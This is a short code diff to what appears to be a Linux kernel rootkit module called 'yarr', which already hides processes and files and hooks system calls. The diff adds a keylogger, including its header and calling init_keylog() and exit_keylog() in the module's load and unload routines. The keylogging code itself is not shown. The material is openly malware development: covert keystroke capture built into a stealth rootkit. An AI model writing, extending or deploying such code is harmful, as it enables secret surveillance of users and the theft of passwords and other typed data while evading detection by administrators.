@@ -32,6 +32,7 @@
 #include "hook.h"
 #include "hideproc.h"
 #include "hidefile.h"
+#include "keylog.h"
 
 #ifndef __KERNEL__
 #define __KERNEL__
@@ -174,6 +175,9 @@ static int __init yarr_loader(void) {
 	// Initialize everything related with hidding files.
 	init_hidefile();
 
+	// Initialize everything related with they keylogging.
+	init_keylog();
+
 	// Hook the system calls.
 	hook_syscalls(HOOKING_METHOD);
 
@@ -205,6 +209,9 @@ static void __exit yarr_unloader(void) {
 
 	// Undo syscall hooks.
 	unhook_syscalls(HOOKING_METHOD);
+
+	// End logging keystrokes.
+	exit_keylog();
 
 	// End hiding files.
 	exit_hidefile();
